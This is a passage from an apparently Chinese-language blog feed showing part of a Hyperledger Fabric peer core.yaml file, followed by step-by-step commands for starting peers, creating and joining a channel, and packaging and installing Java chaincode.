class="hljs-comment"># during user chaincode instantiation.</span><br>    <span class="hljs-comment"># Useful when using moving image tags (such as :latest)</span><br>    <span class="hljs-attr">pull:</span> <span class="hljs-literal">false</span><br><br>    <span class="hljs-attr">golang:</span><br>        <span class="hljs-comment"># golang will never need more than baseos</span><br>        <span class="hljs-attr">runtime:</span> <span class="hljs-string">$(DOCKER_NS)/fabric-baseos:$(TWO_DIGIT_VERSION)</span><br><br>        <span class="hljs-comment"># whether or not golang chaincode should be linked dynamically</span><br>        <span class="hljs-attr">dynamicLink:</span> <span class="hljs-literal">false</span><br><br>    <span class="hljs-attr">java:</span><br>        <span class="hljs-comment"># This is an image based on java:openjdk-8 with addition compiler</span><br>        <span class="hljs-comment"># tools added for java shim layer packaging.</span><br>        <span class="hljs-comment"># This image is packed with shim layer libraries that are necessary</span><br>        <span class="hljs-comment"># for Java chaincode runtime.</span><br>        <span class="hljs-attr">runtime:</span> <span class="hljs-string">$(DOCKER_NS)/fabric-javaenv:$(TWO_DIGIT_VERSION)</span><br><br>    <span class="hljs-attr">node:</span><br>        <span class="hljs-comment"># This is an image based on node:$(NODE_VER)-alpine</span><br>        <span class="hljs-attr">runtime:</span> <span class="hljs-string">$(DOCKER_NS)/fabric-nodeenv:$(TWO_DIGIT_VERSION)</span><br><br>    <span class="hljs-comment"># List of directories to treat as external builders and launchers for</span><br>    <span class="hljs-comment"># chaincode. The external builder detection processing will iterate over the</span><br>    <span class="hljs-comment"># builders in the order specified below.</span><br>    <span class="hljs-comment"># If you don&#x27;t need to fallback to the default Docker builder, also unconfigure vm.endpoint above.</span><br>    <span class="hljs-comment"># To override this property via env variable use CORE_CHAINCODE_EXTERNALBUILDERS: [&#123;name: x, path: dir1&#125;, &#123;name: y, path: dir2&#125;]</span><br>    <span class="hljs-attr">externalBuilders:</span><br>       <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">ccaas_builder</span><br>         <span class="hljs-attr">path:</span> <span class="hljs-string">/opt/hyperledger/ccaas_builder</span><br>         <span class="hljs-attr">propagateEnvironment:</span><br>           <span class="hljs-bullet">-</span> <span class="hljs-string">CHAINCODE_AS_A_SERVICE_BUILDER_CONFIG</span><br><br><br>    <span class="hljs-comment"># The maximum duration to wait for the chaincode build and install process</span><br>    <span class="hljs-comment"># to complete.</span><br>    <span class="hljs-attr">installTimeout:</span> <span class="hljs-string">300s</span><br><br>    <span class="hljs-comment"># Timeout duration for starting up a container and waiting for Register</span><br>    <span class="hljs-comment"># to come through.</span><br>    <span class="hljs-attr">startuptimeout:</span> <span class="hljs-string">300s</span><br><br>    <span class="hljs-comment"># Timeout duration for Invoke and Init calls to prevent runaway.</span><br>    <span class="hljs-comment"># This timeout is used by all chaincodes in all the channels, including</span><br>    <span class="hljs-comment"># system chaincodes.</span><br>    <span class="hljs-comment"># Note that during Invoke, if the image is not available (e.g. being</span><br>    <span class="hljs-comment"># cleaned up when in development environment), the peer will automatically</span><br>    <span class="hljs-comment"># build the image, which might take more time. In production environment,</span><br>    <span class="hljs-comment"># the chaincode image is unlikely to be deleted, so the timeout could be</span><br>    <span class="hljs-comment"># reduced accordingly.</span><br>    <span class="hljs-attr">executetimeout:</span> <span class="hljs-string">30s</span><br><br>    <span class="hljs-comment"># There are 2 modes: &quot;dev&quot; and &quot;net&quot;.</span><br>    <span class="hljs-comment"># In dev mode, user runs the chaincode after starting peer from</span><br>    <span class="hljs-comment"># command line on local machine.</span><br>    <span class="hljs-comment"># In net mode, peer will run chaincode in a docker container.</span><br>    <span class="hljs-attr">mode:</span> <span class="hljs-string">net</span><br><br>    <span class="hljs-comment"># keepalive in seconds. In situations where the communication goes through a</span><br>    <span class="hljs-comment"># proxy that does not support keep-alive, this parameter will maintain connection</span><br>    <span class="hljs-comment"># between peer and chaincode.</span><br>    <span class="hljs-comment"># A value &lt;= 0 turns keepalive off</span><br>    <span class="hljs-attr">keepalive:</span> <span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># enabled system chaincodes</span><br>    <span class="hljs-attr">system:</span><br>        <span class="hljs-attr">_lifecycle:</span> <span class="hljs-string">enable</span><br>        <span class="hljs-attr">cscc:</span> <span class="hljs-string">enable</span><br>        <span class="hljs-attr">lscc:</span> <span class="hljs-string">enable</span><br>        <span class="hljs-attr">qscc:</span> <span class="hljs-string">enable</span><br><br>    <span class="hljs-comment"># Logging section for the chaincode container</span><br>    <span class="hljs-attr">logging:</span><br>      <span class="hljs-comment"># Default level for all loggers within the chaincode container</span><br>      <span class="hljs-attr">level:</span>  <span class="hljs-string">info</span><br>      <span class="hljs-comment"># Override default level for the &#x27;shim&#x27; logger</span><br>      <span class="hljs-attr">shim:</span>   <span class="hljs-string">warning</span><br>      <span class="hljs-comment"># Format for the chaincode container logs</span><br>      <span class="hljs-attr">format:</span> <span class="hljs-string">&#x27;<span class="hljs-template-variable">%&#123;color&#125;</span><span class="hljs-template-variable">%&#123;time:2006-01-02 15:04:05.000 MST&#125;</span> [<span class="hljs-template-variable">%&#123;module&#125;</span>] <span class="hljs-template-variable">%&#123;shortfunc&#125;</span> -&gt; <span class="hljs-template-variable">%&#123;level:.4s&#125;</span> <span class="hljs-template-variable">%&#123;id:03x&#125;</span><span class="hljs-template-variable">%&#123;color:reset&#125;</span> <span class="hljs-template-variable">%&#123;message&#125;</span>&#x27;</span><br><br><span class="hljs-comment">###############################################################################</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#    Ledger section - ledger configuration encompasses both the blockchain</span><br><span class="hljs-comment">#    and the state</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">###############################################################################</span><br><span class="hljs-attr">ledger:</span><br><br>  <span class="hljs-attr">blockchain:</span><br><br>  <span class="hljs-attr">state:</span><br>    <span class="hljs-comment"># stateDatabase - options are &quot;goleveldb&quot;, &quot;CouchDB&quot;</span><br>    <span class="hljs-comment"># goleveldb - default state database stored in goleveldb.</span><br>    <span class="hljs-comment"># CouchDB - store state database in CouchDB</span><br>    <span class="hljs-attr">stateDatabase:</span> <span class="hljs-string">goleveldb</span><br>    <span class="hljs-comment"># Limit on the number of records to return per query</span><br>    <span class="hljs-attr">totalQueryLimit:</span> <span class="hljs-number">100000</span><br>    <span class="hljs-attr">couchDBConfig:</span><br>       <span class="hljs-comment"># It is recommended to run CouchDB on the same server as the peer, and</span><br>       <span class="hljs-comment"># not map the CouchDB container port to a server port in docker-compose.</span><br>       <span class="hljs-comment"># Otherwise proper security must be provided on the connection between</span><br>       <span class="hljs-comment"># CouchDB client (on the peer) and server.</span><br>       <span class="hljs-attr">couchDBAddress:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:5984</span><br>       <span class="hljs-comment"># This username must have read and write authority on CouchDB</span><br>       <span class="hljs-attr">username:</span><br>       <span class="hljs-comment"># The password is recommended to pass as an environment variable</span><br>       <span class="hljs-comment"># during start up (eg CORE_LEDGER_STATE_COUCHDBCONFIG_PASSWORD).</span><br>       <span class="hljs-comment"># If it is stored here, the file must be access control protected</span><br>       <span class="hljs-comment"># to prevent unintended users from discovering the password.</span><br>       <span class="hljs-attr">password:</span><br>       <span class="hljs-comment"># Number of retries for CouchDB errors</span><br>       <span class="hljs-attr">maxRetries:</span> <span class="hljs-number">3</span><br>       <span class="hljs-comment"># Number of retries for CouchDB errors during peer startup.</span><br>       <span class="hljs-comment"># The delay between retries doubles for each attempt.</span><br>       <span class="hljs-comment"># Default of 10 retries results in 11 attempts over 2 minutes.</span><br>       <span class="hljs-attr">maxRetriesOnStartup:</span> <span class="hljs-number">10</span><br>       <span class="hljs-comment"># CouchDB request timeout (unit: duration, e.g. 20s)</span><br>       <span class="hljs-attr">requestTimeout:</span> <span class="hljs-string">35s</span><br>       <span class="hljs-comment"># Limit on the number of records per each CouchDB query</span><br>       <span class="hljs-comment"># Note that chaincode queries are only bound by totalQueryLimit.</span><br>       <span class="hljs-comment"># Internally the chaincode may execute multiple CouchDB queries,</span><br>       <span class="hljs-comment"># each of size internalQueryLimit.</span><br>       <span class="hljs-attr">internalQueryLimit:</span> <span class="hljs-number">1000</span><br>       <span class="hljs-comment"># Limit on the number of records per CouchDB bulk update batch</span><br>       <span class="hljs-attr">maxBatchUpdateSize:</span> <span class="hljs-number">1000</span><br>       <span class="hljs-comment"># Create the _global_changes system database</span><br>       <span class="hljs-comment"># This is optional.  Creating the global changes database will require</span><br>       <span class="hljs-comment"># additional system resources to track changes and maintain the database</span><br>       <span class="hljs-attr">createGlobalChangesDB:</span> <span class="hljs-literal">false</span><br>       <span class="hljs-comment"># CacheSize denotes the maximum mega bytes (MB) to be allocated for the in-memory state</span><br>       <span class="hljs-comment"># cache. Note that CacheSize needs to be a multiple of 32 MB. If it is not a multiple</span><br>       <span class="hljs-comment"># of 32 MB, the peer would round the size to the next multiple of 32 MB.</span><br>       <span class="hljs-comment"># To disable the cache, 0 MB needs to be assigned to the cacheSize.</span><br>       <span class="hljs-attr">cacheSize:</span> <span class="hljs-number">64</span><br><br>  <span class="hljs-attr">history:</span><br>    <span class="hljs-comment"># enableHistoryDatabase - options are true or false</span><br>    <span class="hljs-comment"># Indicates if the history of key updates should be stored.</span><br>    <span class="hljs-comment"># All history &#x27;index&#x27; will be stored in goleveldb, regardless if using</span><br>    <span class="hljs-comment"># CouchDB or alternate database for the state.</span><br>    <span class="hljs-attr">enableHistoryDatabase:</span> <span class="hljs-literal">true</span><br><br>  <span class="hljs-attr">pvtdataStore:</span><br>    <span class="hljs-comment"># the maximum db batch size for converting</span><br>    <span class="hljs-comment"># the ineligible missing data entries to eligible missing data entries</span><br>    <span class="hljs-attr">collElgProcMaxDbBatchSize:</span> <span class="hljs-number">5000</span><br>    <span class="hljs-comment"># the minimum duration (in milliseconds) between writing</span><br>    <span class="hljs-comment"># two consecutive db batches for converting the ineligible missing data entries to eligible missing data entries</span><br>    <span class="hljs-attr">collElgProcDbBatchesInterval:</span> <span class="hljs-number">1000</span><br>    <span class="hljs-comment"># The missing data entries are classified into two categories:</span><br>    <span class="hljs-comment"># (1) prioritized</span><br>    <span class="hljs-comment"># (2) deprioritized</span><br>    <span class="hljs-comment"># Initially, all missing data are in the prioritized list. When the</span><br>    <span class="hljs-comment"># reconciler is unable to fetch the missing data from other peers,</span><br>    <span class="hljs-comment"># the unreconciled missing data would be moved to the deprioritized list.</span><br>    <span class="hljs-comment"># The reconciler would retry deprioritized missing data after every</span><br>    <span class="hljs-comment"># deprioritizedDataReconcilerInterval (unit: minutes). Note that the</span><br>    <span class="hljs-comment"># interval needs to be greater than the reconcileSleepInterval</span><br>    <span class="hljs-attr">deprioritizedDataReconcilerInterval:</span> <span class="hljs-string">60m</span><br><br>  <span class="hljs-attr">snapshots:</span><br>    <span class="hljs-comment"># Path on the file system where peer will store ledger snapshots</span><br>    <span class="hljs-attr">rootDir:</span> <span class="hljs-string">/var/hyperledger/production/snapshots/org1-peer0</span><br><br><span class="hljs-comment">###############################################################################</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#    Operations section</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">###############################################################################</span><br><span class="hljs-attr">operations:</span><br>    <span class="hljs-comment"># host and port for the operations server</span><br>    <span class="hljs-attr">listenAddress:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:9446</span><br><br>    <span class="hljs-comment"># TLS configuration for the operations endpoint</span><br>    <span class="hljs-attr">tls:</span><br>        <span class="hljs-comment"># TLS enabled</span><br>        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">false</span><br>        <span class="hljs-comment"># path to PEM encoded server certificate for the operations server</span><br>        <span class="hljs-attr">cert:</span><br>            <span class="hljs-attr">file:</span><br>        <span class="hljs-comment"># path to PEM encoded server key for the operations server</span><br>        <span class="hljs-attr">key:</span><br>            <span class="hljs-attr">file:</span><br>        <span class="hljs-comment"># most operations service endpoints require client authentication when TLS</span><br>        <span class="hljs-comment"># is enabled. clientAuthRequired requires client certificate authentication</span><br>        <span class="hljs-comment"># at the TLS layer to access all resources.</span><br>        <span class="hljs-attr">clientAuthRequired:</span> <span class="hljs-literal">false</span><br><br>        <span class="hljs-comment"># paths to PEM encoded ca certificates to trust for client authentication</span><br>        <span class="hljs-attr">clientRootCAs:</span><br>            <span class="hljs-attr">files:</span> []<br><span class="hljs-comment">###############################################################################</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#    Metrics section</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">###############################################################################</span><br><span class="hljs-attr">metrics:</span><br>    <span class="hljs-comment"># metrics provider is one of statsd, prometheus, or disabled</span><br>    <span class="hljs-attr">provider:</span> <span class="hljs-string">disabled</span><br><br>    <span class="hljs-comment"># statsd configuration</span><br>    <span class="hljs-attr">statsd:</span><br>        <span class="hljs-comment"># network type: tcp or udp</span><br>        <span class="hljs-attr">network:</span> <span class="hljs-string">udp</span><br>        <span class="hljs-comment"># statsd server address</span><br>        <span class="hljs-attr">address:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8125</span><br>        <span class="hljs-comment"># the interval at which locally cached counters and gauges are pushed</span><br>        <span class="hljs-comment"># to statsd; timings are pushed immediately</span><br>        <span class="hljs-attr">writeInterval:</span> <span class="hljs-string">10s</span><br>        <span class="hljs-comment"># prefix is prepended to all emitted statsd metrics</span><br>        <span class="hljs-attr">prefix:</span><br></code></pre></td></tr></table></figure><p>启动org1-peer1节点（启动peer节点之前需要先启动orderer节点）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#后台启动</span><br><span class="hljs-attribute">nohup</span> ./peer node start &gt; org<span class="hljs-number">1</span>-peer<span class="hljs-number">0</span>.log <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> &amp;<br><span class="hljs-comment">#查看生成的日志文件</span><br><span class="hljs-attribute">tail</span> -f org<span class="hljs-number">1</span>-peer<span class="hljs-number">1</span>.log<br></code></pre></td></tr></table></figure><p>org1-peer1和org2-peer0、org2-peer1都是同理，修改core.yaml文件中的端口和证书路径以及 peer 存储分类快照的文件的路径即可</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle">创建通道<br>export CORE_PEER_LOCALMSPID=Org1MSP<br>export CORE_PEER_MSPCONFIGPATH=<span class="hljs-regexp">/home/m</span>oindy<span class="hljs-regexp">/project/</span>fabric<span class="hljs-regexp">/crypto-config/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/u</span>sers<span class="hljs-regexp">/Admin@org1.example.com/m</span>sp<br><br>.<span class="hljs-regexp">/peer channel create -o orderer.example.com:7050 -c businesschannel -f &quot;/</span>home<span class="hljs-regexp">/moindy/</span><span class="hljs-keyword">project</span><span class="hljs-regexp">/fabric/</span>channel-<span class="hljs-keyword">artifacts</span><span class="hljs-regexp">/businesschannel.tx&quot; --timeout &quot;30s&quot; --tls --cafile /</span>home<span class="hljs-regexp">/moindy/</span><span class="hljs-keyword">project</span><span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/ordererOrganizations/</span>example.com<span class="hljs-regexp">/orderers/</span>orderer.example.com<span class="hljs-regexp">/msp/</span>tlscacerts/tlsca.example.com-cert.pem<br>#创建成功之后会在当面路径下面生成businesschannel.block文件<br>mv businesschannel.block <span class="hljs-regexp">/home/m</span>oindy<span class="hljs-regexp">/project/</span>fabric/channel-<span class="hljs-keyword">artifacts</span><br><br></code></pre></td></tr></table></figure><h3 id="加入通道"><a href="#加入通道" class="headerlink" title="加入通道"></a>加入通道</h3><p>org1-peer0加入之前生成的通道中：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">export CORE_PEER_TLS_ENABLED=<span class="hljs-keyword">true</span><br>export CORE_PEER_LOCALMSPID=<span class="hljs-string">&quot;Org1MSP&quot;</span><br>export CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-regexp">/home/m</span>oindy<span class="hljs-regexp">/project/</span>fabric<span class="hljs-regexp">/crypto-config/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/</span>peers<span class="hljs-regexp">/peer0.org1.example.com/</span>tls/ca.crt<br>export CORE_PEER_MSPCONFIGPATH=<span class="hljs-regexp">/home/m</span>oindy<span class="hljs-regexp">/project/</span>fabric<span class="hljs-regexp">/crypto-config/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/u</span>sers<span class="hljs-regexp">/Admin@org1.example.com/m</span>sp<br>export CORE_PEER_ADDRESS=peer0.org1.example.com:<span class="hljs-number">7051</span><br><br>.<span class="hljs-regexp">/peer channel join -b /</span>home<span class="hljs-regexp">/moindy/</span><span class="hljs-keyword">project</span><span class="hljs-regexp">/fabric/</span>channel-<span class="hljs-keyword">artifacts</span>/businesschannel.block<br></code></pre></td></tr></table></figure><p>org1-peer1加入通道</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">export CORE_PEER_TLS_ENABLED=<span class="hljs-keyword">true</span><br>export CORE_PEER_LOCALMSPID=<span class="hljs-string">&quot;Org1MSP&quot;</span><br>export CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-regexp">/home/m</span>oindy<span class="hljs-regexp">/project/</span>fabric<span class="hljs-regexp">/crypto-config/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/</span>peers<span class="hljs-regexp">/peer1.org1.example.com/</span>tls/ca.crt<br>export CORE_PEER_MSPCONFIGPATH=<span class="hljs-regexp">/home/m</span>oindy<span class="hljs-regexp">/project/</span>fabric<span class="hljs-regexp">/crypto-config/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/u</span>sers<span class="hljs-regexp">/Admin@org1.example.com/m</span>sp<br>export CORE_PEER_ADDRESS=peer1.org1.example.com:<span class="hljs-number">8051</span><br><br>.<span class="hljs-regexp">/peer channel join -b /</span>home<span class="hljs-regexp">/moindy/</span><span class="hljs-keyword">project</span><span class="hljs-regexp">/fabric/</span>channel-<span class="hljs-keyword">artifacts</span>/businesschannel.block<br></code></pre></td></tr></table></figure><p>org2-peer0加入通道</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">export CORE_PEER_TLS_ENABLED=<span class="hljs-keyword">true</span><br>export CORE_PEER_LOCALMSPID=<span class="hljs-string">&quot;Org2MSP&quot;</span><br>export CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-regexp">/home/m</span>oindy<span class="hljs-regexp">/project/</span>fabric<span class="hljs-regexp">/crypto-config/</span>peerOrganizations<span class="hljs-regexp">/org2.example.com/</span>peers<span class="hljs-regexp">/peer0.org2.example.com/</span>tls/ca.crt<br>export CORE_PEER_MSPCONFIGPATH=<span class="hljs-regexp">/home/m</span>oindy<span class="hljs-regexp">/project/</span>fabric<span class="hljs-regexp">/crypto-config/</span>peerOrganizations<span class="hljs-regexp">/org2.example.com/u</span>sers<span class="hljs-regexp">/Admin@org2.example.com/m</span>sp<br>export CORE_PEER_ADDRESS=peer0.org2.example.com:<span class="hljs-number">9051</span><br><br>.<span class="hljs-regexp">/peer channel join -b /</span>home<span class="hljs-regexp">/moindy/</span><span class="hljs-keyword">project</span><span class="hljs-regexp">/fabric/</span>channel-<span class="hljs-keyword">artifacts</span>/businesschannel.block<br></code></pre></td></tr></table></figure><p>org2-peer1加入通道</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">export CORE_PEER_TLS_ENABLED=<span class="hljs-keyword">true</span><br>export CORE_PEER_LOCALMSPID=<span class="hljs-string">&quot;Org2MSP&quot;</span><br>export CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-regexp">/home/m</span>oindy<span class="hljs-regexp">/project/</span>fabric<span class="hljs-regexp">/crypto-config/</span>peerOrganizations<span class="hljs-regexp">/org2.example.com/</span>peers<span class="hljs-regexp">/peer1.org2.example.com/</span>tls/ca.crt<br>export CORE_PEER_MSPCONFIGPATH=<span class="hljs-regexp">/home/m</span>oindy<span class="hljs-regexp">/project/</span>fabric<span class="hljs-regexp">/crypto-config/</span>peerOrganizations<span class="hljs-regexp">/org2.example.com/u</span>sers<span class="hljs-regexp">/Admin@org2.example.com/m</span>sp<br>export CORE_PEER_ADDRESS=peer1.org2.example.com:<span class="hljs-number">10051</span><br><br>.<span class="hljs-regexp">/peer channel join -b /</span>home<span class="hljs-regexp">/moindy/</span><span class="hljs-keyword">project</span><span class="hljs-regexp">/fabric/</span>channel-<span class="hljs-keyword">artifacts</span>/businesschannel.block<br></code></pre></td></tr></table></figure><p>查看当前peer节点加入的通道：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./peer</span> channel list<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Blockchain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>chaincode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fabric-gateway-java</title>
    <link href="/2022/03/29/fabric-gateway-java/"/>
    <url>/2022/03/29/fabric-gateway-java/</url>
    
    <content type="html"><![CDATA[<h3 id="部署合约"><a href="#部署合约" class="headerlink" title="部署合约"></a>部署合约</h3><p>1.maven部署需要下载很多依赖导致合约部署过程会非常漫长，所以可以直接在IDEA中对maven进行封装</p><p><img src="/2022/03/29/fabric-gateway-java/image-20220330171505985.png" alt="image-20220330171505985"></p><p>封装好的jar包就会保存在当前项目的target下，将生成好的chaincode.jar复制到虚拟机需要部署合约的文件夹中</p><p><img src="/2022/03/29/fabric-gateway-java/image-20220330171640230.png" alt="image-20220330171640230"></p><p>然后对合约进行部署：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#将bin目录中的二进制文件添加到CLI路径中</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/../bin:$PATH<br><span class="hljs-comment">#使用peer cli进行创建</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">FABRIC_CFG_PATH</span>=<span class="hljs-variable">$PWD</span>/../config/<br><span class="hljs-comment">#设置fabric_cfg_path指向fabric-samples的core.yaml文件</span><br></code></pre></td></tr></table></figure><h4 id="1-1-创建链码包"><a href="#1-1-创建链码包" class="headerlink" title="1.1 创建链码包"></a>1.1 创建链码包</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">peer lifecycle chaincode package java-gateway-demo.tar.gz <span class="hljs-params">--path</span> <span class="hljs-string">../java-gateway-demo/</span> <span class="hljs-params">--lang</span> java <span class="hljs-params">--label</span> java-gateway-demo_1<br></code></pre></td></tr></table></figure><h4 id="1-2-安装链码"><a href="#1-2-安装链码" class="headerlink" title="1.2 安装链码"></a>1.2 安装链码</h4><p>设置org1节点安装链码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ENABLED</span>=<span class="hljs-literal">true</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=<span class="hljs-string">&quot;Org1MSP&quot;</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_ADDRESS</span>=localhost:7051<br><span class="hljs-comment">#安装链码</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">peer </span>lifecycle chaincode install java-gateway-demo.tar.gz<br></code></pre></td></tr></table></figure><p>org2同理</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=<span class="hljs-string">&quot;Org2MSP&quot;</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_ADDRESS</span>=localhost:9051<br><span class="hljs-comment">#安装链码</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">peer </span>lifecycle chaincode install java-gateway-demo.tar.gz<br></code></pre></td></tr></table></figure><strong><font color="red">注意：安装链码时，链码由peer节点构建。如果智能合约代码有问题，install命令将从链码中返回所有构建错误。因为安装 java 链码的时候需要经过 maven 构建以及下载依赖包的过程这个过程有可能会较慢，所以 install 命令有可能会返回一个超时错误:。但是其实链码的 docker 容器内此时还在执行构建任务没有完成。等到构建成功了链码包也就安装成功了。</font></strong><p><img src="/2022/03/29/fabric-gateway-java/image-20220330172320681.png" alt="image-20220330172320681"></p><h4 id="1-3-通过链码定义参数"><a href="#1-3-通过链码定义参数" class="headerlink" title="1.3 通过链码定义参数"></a>1.3 通过链码定义参数</h4><p>安装链码之后需要通过链码定义名称、版本、和背书策略</p><p>如果链码中已经安装过则需要在其组织通过的链码定义中包括包ID。包ID将用于将peer节点上安装的链码与通过的链码的定义相关联，并且允许组织使用链码来认可交易。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#查询包的ID</span><br><span class="hljs-attribute">peer</span> lifecycle chaincode queryinstalled<br><span class="hljs-comment">#将返回的结果添加到环境变量中</span><br><span class="hljs-attribute">export</span> NEW_CC_PACKAGE_ID=hyperledger-fabric-contract-java-demo_<span class="hljs-number">2</span>:c<span class="hljs-number">0</span>f<span class="hljs-number">7</span>f<span class="hljs-number">11</span>c<span class="hljs-number">5</span>a<span class="hljs-number">75</span>b<span class="hljs-number">0872</span>cec<span class="hljs-number">6</span>cf<span class="hljs-number">69</span>ee<span class="hljs-number">6</span>c<span class="hljs-number">8</span>ca<span class="hljs-number">7</span>d<span class="hljs-number">6</span>cdec<span class="hljs-number">5</span>df<span class="hljs-number">35</span>e<span class="hljs-number">1364</span>c<span class="hljs-number">4</span>e<span class="hljs-number">949064</span>a<span class="hljs-number">8</span>b<span class="hljs-number">831</span><br></code></pre></td></tr></table></figure><h4 id="1-4-org1通过链码定义"><a href="#1-4-org1通过链码定义" class="headerlink" title="1.4 org1通过链码定义"></a>1.4 org1通过链码定义</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#设置链码</span><br>export CORE_PEER_LOCALMSPID=<span class="hljs-string">&quot;Org1MSP&quot;</span><br>export CORE_PEER_MSPCONFIGPATH=<span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/u</span>sers<span class="hljs-regexp">/Admin@org1.example.com/m</span>sp<br>export 